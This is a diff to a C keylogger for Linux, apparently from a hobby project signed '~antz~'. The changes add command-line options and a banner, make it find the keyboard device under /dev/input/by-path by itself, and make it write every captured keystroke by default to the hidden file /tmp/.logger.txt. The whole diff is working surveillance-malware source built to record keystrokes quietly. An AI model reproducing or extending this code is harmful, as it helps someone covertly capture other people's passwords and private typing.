@@ -289,8 +289,10 @@ struct input_event {
 #include <stdlib.h>
 #include <string.h>
 #include <signal.h>
+#include <dirent.h>
+#include <unistd.h>
 
-char* code_to_str(int code)
+char* code_to_char(int code)
 {
 	switch(code)
 	{
@@ -420,27 +422,102 @@ void handler()
 }
 
 //It must be run as root
-// sudo ./keylogger /dev/input/by-path/xxxx-event-kbd /path/to/file
+// sudo ./Simple_Local_Keylogger [-d device] [ -o /path/to/file.txt]
+
+void banner()
+{
+	
+fprintf(stderr,"_____/\\\\\\\\\\\\\\\\\\\\\\\____/\\\\\\______________/\\\\\\________/\\\\\\_\n");        
+fprintf(stderr," ___/\\\\\\/////////\\\\\\_\\/\\\\\\_____________\\/\\\\\\_____/\\\\\\//__\n");       
+fprintf(stderr,"  __\\//\\\\\\______\\///__\\/\\\\\\_____________\\/\\\\\\__/\\\\\\//_____\n");      
+fprintf(stderr,"   ___\\////\\\\\\_________\\/\\\\\\_____________\\/\\\\\\\\\\\\//\\\\\\_____\n");     
+fprintf(stderr,"    ______\\////\\\\\\______\\/\\\\\\_____________\\/\\\\\\//_\\//\\\\\\____\n");    
+fprintf(stderr,"     _________\\////\\\\\\___\\/\\\\\\_____________\\/\\\\\\____\\//\\\\\\___\n");   
+fprintf(stderr,"      __/\\\\\\______\\//\\\\\\__\\/\\\\\\_____________\\/\\\\\\_____\\//\\\\\\__\n");  
+fprintf(stderr,"       _\\///\\\\\\\\\\\\\\\\\\\\\\/___\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\______\\//\\\\\\_\n"); 
+fprintf(stderr,"        ___\\///////////_____\\///////////////__\\///________\\///__\n");
+fprintf(stderr,"\n~antz~\n");
+
+}
+
+
+#define LEN 64
 
 int main(int argc, char** argv)
 {	
-	struct input_event event; 
-	int dev, readed, size = sizeof(struct input_event);	
+	struct input_event event;
+	struct dirent *curr;
+	char name[LEN], filetxt[LEN]; 
+	int c, d = 0, o = 0, dev, readed, size = sizeof(struct input_event), check = 1;	
+	DIR *directory;
 	FILE *dst;	
+
+	void usage()
+	{
+		banner();
+		fprintf(stderr,"\nUsage: #%s [-d device] [-o output.txt]\n", argv[0]);
+		exit(0);
+	}
 	
+	while((c = getopt(argc, argv, ":d:o:")) != -1)
+	{
+		switch(c)
+		{
+			case 'd': 
+					strncpy(name, optarg, LEN); 
+					name[LEN-1] = '\0';
+					d = 1;
+					break;
+			case 'o': 	strncpy(filetxt, optarg, LEN); 
+					filetxt[LEN-1] = '\0';
+					o = 1;
+					break;
+			default:
+					usage();
+		}
+	}
+
+	
+
 	if(signal(SIGINT, handler) == SIG_ERR)
 	{
 		fprintf(stderr, "Error to handle SIGINT\n");
 		exit(1);
 	}
-
-	if( (dst = fopen(argv[2], "a")) == NULL)
+	if(!o)
+	{
+		snprintf(filetxt, 17, "/tmp/.logger.txt");
+	}
+	if( (dst = fopen(filetxt, "a")) == NULL)
 	{
 		fprintf(stderr,"Error to open file\n");
 		exit(1);
 	}
+	
+	if(!d)
+	{
+		if((directory = opendir("/dev/input/by-path")) == NULL)
+		{	
+			fprintf(stderr, "Failed to open dir \"/dev/input/by-path\"\n");
+			exit(1);
+		}
+		while((curr = readdir(directory)) != NULL)
+		{
+			if(strstr(curr->d_name, "kbd"))
+			{
+				snprintf(name, LEN, "/dev/input/by-path/%s", curr->d_name);
+				check = 0;
+				break;
+			}
+		}
+		if(check)
+		{
+			fprintf(stderr, "Failed to find device..\n");
+			exit(1);
+		}
+	}
 
-	if( (dev = open(argv[1], O_RDONLY)) == -1)
+	if((dev = open(name, O_RDONLY)) == -1)
 	{
 		fprintf(stderr,"Failed to open %s\n", argv[1]);
 		exit(1);
@@ -458,7 +535,7 @@ int main(int argc, char** argv)
 		
 		if(event.type == EV_KEY && !event.value)
 			
-			fprintf(dst,"%s",code_to_str(event.code));
+			fprintf(dst,"%s",code_to_char(event.code));
 			fflush(NULL);
 			
 	}
